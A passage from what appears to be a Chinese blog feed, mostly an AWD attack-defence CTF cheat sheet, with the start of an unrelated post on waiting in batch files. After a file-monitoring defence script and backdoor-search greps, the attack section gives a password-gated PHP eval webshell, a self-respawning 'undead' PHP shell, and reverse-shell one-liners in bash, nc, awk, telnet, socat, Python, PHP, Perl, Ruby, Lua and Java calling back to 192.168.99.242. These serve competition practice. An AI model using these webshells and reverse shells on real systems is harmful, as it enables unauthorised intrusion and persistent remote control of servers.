class="token punctuation">.</span>isdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token keyword">raise</span><span class="token comment"># 获取当前所有文件路径</span><span class="token keyword">def</span> <span class="token function">getfilelist</span><span class="token punctuation">(</span>cwd<span class="token punctuation">)</span><span class="token punctuation">:</span>    filelist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> root<span class="token punctuation">,</span>subdirs<span class="token punctuation">,</span> files <span class="token keyword">in</span> os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span>cwd<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> filepath <span class="token keyword">in</span> files<span class="token punctuation">:</span>            originalfile <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>root<span class="token punctuation">,</span> filepath<span class="token punctuation">)</span>            <span class="token keyword">if</span> Special_path_str <span class="token keyword">not</span> <span class="token keyword">in</span> originalfile<span class="token punctuation">:</span>                filelist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>originalfile<span class="token punctuation">)</span>    <span class="token keyword">return</span> filelist<span class="token comment"># 计算机文件MD5值</span><span class="token keyword">def</span> <span class="token function">calcMD5</span><span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filepath<span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            md5obj <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>            md5obj<span class="token punctuation">.</span>update<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token builtin">hash</span> <span class="token operator">=</span> md5obj<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token builtin">hash</span>    <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">u'[!] getmd5_error : '</span> <span class="token operator">+</span> getUnicode<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span>        <span class="token keyword">print</span> getUnicode<span class="token punctuation">(</span>e<span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            ORIGIN_FILE_LIST<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span>            FILE_MD5_DICT<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> KeyError<span class="token punctuation">,</span> e<span class="token punctuation">:</span>            <span class="token keyword">pass</span><span class="token comment"># 获取所有文件MD5</span><span class="token keyword">def</span> <span class="token function">getfilemd5dict</span><span class="token punctuation">(</span>filelist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    filemd5dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> ori_file <span class="token keyword">in</span> filelist<span class="token punctuation">:</span>        <span class="token keyword">if</span> Special_path_str <span class="token keyword">not</span> <span class="token keyword">in</span> ori_file<span class="token punctuation">:</span>            md5 <span class="token operator">=</span> calcMD5<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>realpath<span class="token punctuation">(</span>ori_file<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> md5<span class="token punctuation">:</span>                filemd5dict<span class="token punctuation">[</span>ori_file<span class="token punctuation">]</span> <span class="token operator">=</span> md5    <span class="token keyword">return</span> filemd5dict<span class="token comment"># 备份所有文件</span><span class="token keyword">def</span> <span class="token function">backup_file</span><span class="token punctuation">(</span>filelist<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># if len(os.listdir(Special_path['bak'])) == 0:</span>    <span class="token keyword">for</span> filepath <span class="token keyword">in</span> filelist<span class="token punctuation">:</span>        <span class="token keyword">if</span> Special_path_str <span class="token keyword">not</span> <span class="token keyword">in</span> filepath<span class="token punctuation">:</span>            shutil<span class="token punctuation">.</span>copy2<span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> Special_path<span class="token punctuation">[</span><span class="token string">'bak'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token string">u'---------start------------'</span>    <span class="token keyword">for</span> value <span class="token keyword">in</span> Special_path<span class="token punctuation">:</span>        mkdir_p<span class="token punctuation">(</span>Special_path<span class="token punctuation">[</span>value<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment"># 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件</span>    ORIGIN_FILE_LIST <span class="token operator">=</span> getfilelist<span class="token punctuation">(</span>CWD<span class="token punctuation">)</span>    FILE_MD5_DICT <span class="token operator">=</span> getfilemd5dict<span class="token punctuation">(</span>ORIGIN_FILE_LIST<span class="token punctuation">)</span>    backup_file<span class="token punctuation">(</span>ORIGIN_FILE_LIST<span class="token punctuation">)</span> <span class="token comment"># TODO 备份文件可能会产生重名BUG</span>    <span class="token keyword">print</span> <span class="token string">u'[*] pre work end!'</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        file_list <span class="token operator">=</span> getfilelist<span class="token punctuation">(</span>CWD<span class="token punctuation">)</span>        <span class="token comment"># 移除新上传文件</span>        diff_file_list <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span>file_list<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">set</span><span class="token punctuation">(</span>ORIGIN_FILE_LIST<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>diff_file_list<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token comment"># import pdb;pdb.set_trace()</span>            <span class="token keyword">for</span> filepath <span class="token keyword">in</span> diff_file_list<span class="token punctuation">:</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>                    <span class="token keyword">break</span>                <span class="token keyword">if</span> Special_string <span class="token keyword">not</span> <span class="token keyword">in</span> f<span class="token punctuation">:</span>                    <span class="token keyword">try</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span> <span class="token string">u'[*] webshell find : '</span> <span class="token operator">+</span> getUnicode<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span>                        shutil<span class="token punctuation">.</span>move<span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>Special_path<span class="token punctuation">[</span><span class="token string">'webshell'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ntpath<span class="token punctuation">.</span>basename<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                        <span class="token keyword">print</span> <span class="token string">u'[!] move webshell error, "%s" maybe is webshell.'</span><span class="token operator">%</span>getUnicode<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span>                    <span class="token keyword">try</span><span class="token punctuation">:</span>                        f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>Special_path<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'log.txt'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>                        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'newfile: '</span> <span class="token operator">+</span> getUnicode<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' : '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>                        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                        <span class="token keyword">print</span> <span class="token string">u'[-] log error : file move error: '</span> <span class="token operator">+</span> getUnicode<span class="token punctuation">(</span>e<span class="token punctuation">)</span>        <span class="token comment"># 防止任意文件被修改,还原被修改文件</span>        md5_dict <span class="token operator">=</span> getfilemd5dict<span class="token punctuation">(</span>ORIGIN_FILE_LIST<span class="token punctuation">)</span>        <span class="token keyword">for</span> filekey <span class="token keyword">in</span> md5_dict<span class="token punctuation">:</span>            <span class="token keyword">if</span> md5_dict<span class="token punctuation">[</span>filekey<span class="token punctuation">]</span> <span class="token operator">!=</span> FILE_MD5_DICT<span class="token punctuation">[</span>filekey<span class="token punctuation">]</span><span class="token punctuation">:</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filekey<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>                    <span class="token keyword">break</span>                <span class="token keyword">if</span> Special_string <span class="token keyword">not</span> <span class="token keyword">in</span> f<span class="token punctuation">:</span>                    <span class="token keyword">try</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span> <span class="token string">u'[*] file had be change : '</span> <span class="token operator">+</span> getUnicode<span class="token punctuation">(</span>filekey<span class="token punctuation">)</span>                        shutil<span class="token punctuation">.</span>move<span class="token punctuation">(</span>filekey<span class="token punctuation">,</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>Special_path<span class="token punctuation">[</span><span class="token string">'difffile'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ntpath<span class="token punctuation">.</span>basename<span class="token punctuation">(</span>filekey<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        shutil<span class="token punctuation">.</span>move<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>Special_path<span class="token punctuation">[</span><span class="token string">'bak'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ntpath<span class="token punctuation">.</span>basename<span class="token punctuation">(</span>filekey<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> filekey<span class="token punctuation">)</span>                    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                        <span class="token keyword">print</span> <span class="token string">u'[!] move webshell error, "%s" maybe is webshell.'</span><span class="token operator">%</span>getUnicode<span class="token punctuation">(</span>filekey<span class="token punctuation">)</span>                    <span class="token keyword">try</span><span class="token punctuation">:</span>                        f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>Special_path<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'log.txt'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>                        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'diff_file: '</span> <span class="token operator">+</span> getUnicode<span class="token punctuation">(</span>filekey<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' : '</span> <span class="token operator">+</span> getUnicode<span class="token punctuation">(</span>time<span class="token punctuation">.</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>                        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                        <span class="token keyword">print</span> <span class="token string">u'[-] log error : done_diff: '</span> <span class="token operator">+</span> getUnicode<span class="token punctuation">(</span>filekey<span class="token punctuation">)</span>                        <span class="token keyword">pass</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token comment"># print '[*] ' + getUnicode(time.ctime())</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-流量分析"><a href="#6-流量分析" class="headerlink" title="6.流量分析"></a>6.流量分析</h3><p>可通过分析流量利用他人思路攻击他人</p><p>在服务器上抓取流量包可以用tcpdump</p><p><a href="https://security.tencent.com/index.php/opensource/detail/15">https://security.tencent.com/index.php/opensource/detail/15</a></p><p><a href="http://www.freebuf.com/sectool/126698.html">http://www.freebuf.com/sectool/126698.html</a></p><p><a href="http://www.freebuf.com/sectool/110644.html">http://www.freebuf.com/sectool/110644.html</a></p><p><a href="http://www.freebuf.com/sectool/8982.html">http://www.freebuf.com/sectool/8982.html</a></p><p><a href="http://www.freebuf.com/articles/web/96675.html">http://www.freebuf.com/articles/web/96675.html</a></p><p>工具：</p><p><a href="https://github.com/MaskRay/pcap-search">https://github.com/MaskRay/pcap-search</a></p><p><a href="https://github.com/wupco/weblogger">https://github.com/wupco/weblogger</a></p><h3 id="7-代码审计"><a href="#7-代码审计" class="headerlink" title="7.代码审计"></a>7.代码审计</h3><p>先利用D盾，seay，audit workbench扫一遍再自己审吧</p><p>然后注意一下有没有特殊进程再运行</p><pre class="line-numbers language-none"><code class="language-none"># 简单的查找后门find . -name &#39;*.php&#39; | xargs grep -n &#39;eval(&#39;find . -name &#39;*.php&#39; | xargs grep -n &#39;assert(&#39;find . -name &#39;*.php&#39; | xargs grep -n &#39;system(&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="攻击技巧"><a href="#攻击技巧" class="headerlink" title="攻击技巧"></a>攻击技巧</h2><h3 id="1-弱口令"><a href="#1-弱口令" class="headerlink" title="1.弱口令"></a>1.弱口令</h3><h3 id="2-主机发现"><a href="#2-主机发现" class="headerlink" title="2.主机发现"></a>2.主机发现</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># 使用httpscan脚本</span>./httpscan.py <span class="token number">172.16</span>.0.0/24 –t <span class="token number">10</span><span class="token comment"># masscan</span>masscan -p <span class="token number">80</span> <span class="token number">172.16</span>.0.0/24<span class="token comment"># nmap</span>nmap –sn <span class="token number">172.16</span>.0.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-找后门"><a href="#3-找后门" class="headerlink" title="3.找后门"></a>3.找后门</h3><p>为了照顾新手，比赛可能会为环境预留了简单的一句话木马</p><p>通常可以利用审查工具扫描出来，扫出来之后要立即删除，并尝试利用它去拿手速不够快的同学的分</p><h3 id="4-一句话木马"><a href="#4-一句话木马" class="headerlink" title="4.一句话木马"></a>4.一句话木马</h3><p>自己要用的一句话最好加个md5密码加密验证如</p><p><code>&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;******&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;</code></p><h3 id="5-单文件批量上传"><a href="#5-单文件批量上传" class="headerlink" title="5.单文件批量上传"></a>5.单文件批量上传</h3><p><a href="https://www.freebuf.com/sectool/91082.html">基于PHP一句话实现单个文件批量上传</a></p><h3 id="6-权限维持"><a href="#6-权限维持" class="headerlink" title="6.权限维持"></a>6.权限维持</h3><ol><li><p><strong>不死马</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//进程运行</span><span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//一直执行</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//删除自己</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'.index.php'</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php if(md5($_GET["pass"])=="**********************")&#123;@eval($_POST[a]);&#125; ?>'</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>反弹shell</strong></p><p>nc监听本地端口</p><p><code>nc -lvp 1234</code></p><p><strong>姿势一：bash反弹</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">>&amp;</span> /dev/tcp/192.168.99.242/1234 <span class="token operator"><span class="token file-descriptor important">0</span>>&amp;</span>1base64版：bash -c <span class="token string">'&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljk5LjI0Mi8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其他版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">5</span>&lt;></span>/dev/tcp/192.168.99.242/1234<span class="token punctuation">;</span><span class="token function">cat</span> <span class="token operator">&lt;</span><span class="token file-descriptor important">&amp;5</span> <span class="token operator">|</span> <span class="token keyword">while</span> <span class="token builtin class-name">read</span> line<span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token variable">$line</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;5</span> <span class="token operator">></span><span class="token file-descriptor important">&amp;5</span><span class="token punctuation">;</span><span class="token keyword">done</span><span class="token builtin class-name">exec</span> /bin/sh <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/dev/tcp/192.168.99.242/1234 <span class="token operator"><span class="token file-descriptor important">1</span>></span><span class="token file-descriptor important">&amp;0</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>姿势二：nc反弹</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">nc</span> -e /bin/bash <span class="token number">192.168</span>.99.242 <span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>姿势三：awk反弹</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">awk</span> <span class="token string">'BEGIN&#123;s="/inet/tcp/0/192.168.99.242/1234";for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>姿势四：telnet反弹</strong></p><p>备注：需要在攻击主机上分别监听1234和4321端口，执行反弹shell命令后，在1234终端输入命令，4321查看命令执行后的结果。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">telnet <span class="token number">192.168</span>.99.242 <span class="token number">1234</span> <span class="token operator">|</span> /bin/bash <span class="token operator">|</span> telnet <span class="token number">192.168</span>.99.242 <span class="token number">4321</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>姿势五：socat反弹</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">socat exec:<span class="token string">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:192.168.99.242:1234<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>姿势六：Python反弹</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.99.242',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>姿势七：PHP反弹</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">php <span class="token operator">-</span>r <span class="token string single-quoted-string">'$sock=fsockopen("192.168.99.242",1234);exec("/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3");'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>姿势八：Perl反弹</strong></p><pre class="line-numbers language-none"><code class="language-none">perl -e &#39;use Socket;$i&#x3D;&quot;192.168.99.242&quot;;$p&#x3D;1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>姿势九：Ruby反弹</strong></p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">ruby <span class="token operator">-</span>rsocket <span class="token operator">-</span>e<span class="token string">'f=TCPSocket.open("192.168.99.242",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d >&amp;%d 2>&amp;%d",f,f,f)'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>姿势十：Lua反弹</strong></p><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">lua <span class="token operator">-</span>e <span class="token string">"require('socket');require('os');t=socket.tcp();t:connect('192.168.99.242','1234');os.execute('/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3');"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>姿势十一：JAVA反弹</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Revs</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// TODO Auto-generated method stub</span>        <span class="token class-name">Runtime</span> r <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> cmd<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"exec 5&lt;>/dev/tcp/192.168.99.242/1234;cat &lt;&amp;5 | while read line; do $line 2>&amp;5 >&amp;5; done"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">Process</span> p <span class="token operator">=</span> r<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>保存为Revs.java文件，编译执行，成功反弹shell。</p><pre class="line-numbers language-none"><code class="language-none">javac Revs.java java Revs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/like98k/article/details/80261603">https://blog.csdn.net/like98k/article/details/80261603</a></p><p><a href="https://www.anquanke.com/post/id/86984">https://www.anquanke.com/post/id/86984</a></p><p><a href="https://m09ic.top/posts/7923/">https://m09ic.top/posts/7923/</a></p><p><a href="https://zhuanlan.zhihu.com/p/62588145">https://zhuanlan.zhihu.com/p/62588145</a></p><p><a href="https://blog.csdn.net/qq_43625917/article/details/96158713?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-0&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/qq_43625917/article/details/96158713?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-0&amp;spm=1001.2101.3001.4242</a></p>]]></content>
      
      
      <categories>
          
          <category> AWD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bat_wait</title>
      <link href="2021/other/bat-wait/"/>
      <url>2021/other/bat-wait/</url>
      
        <content type="html"><![CDATA[<h2 id="在bat文件中等待X秒"><a href="#在bat文件中等待X秒" class="headerlink" title="在bat文件中等待X秒"></a>在bat文件中等待X秒</h2><blockquote><p>1.timeout</p><p>2.ping</p></blockquote><h3 id="timeout"><a href="#timeout" class="headerlink" title="timeout"></a>timeout</h3><p><code>timetout</code> 将执行延迟指定的秒数。</p><p><strong>语法</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">timeout</span> <span class="token operator">&lt;</span>seconds<span class="token operator">></span> /nobreak<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>&lt;seconds&gt;</code> 是介于 -1 和 100000 之间的任何值。<code>-1</code> 使计算机无限期地等待直到键盘键击。</p><p><code>/nobreak</code> 忽略用户按键，等待不会受到任何按键干扰。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#等待5s</span><span class="token function">timeout</span> /t <span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p>使用 <code>timeout</code> 命令时 PC 会暂停命令执行几秒钟，但它仍会消耗大量 CPU 负载。带有回送地址 <code>127.0.0.1</code> 的 <code>ping</code> 命令在每个连续的 <code>ping</code> 之间还会产生 1 秒的延迟，并且消耗的 CPU 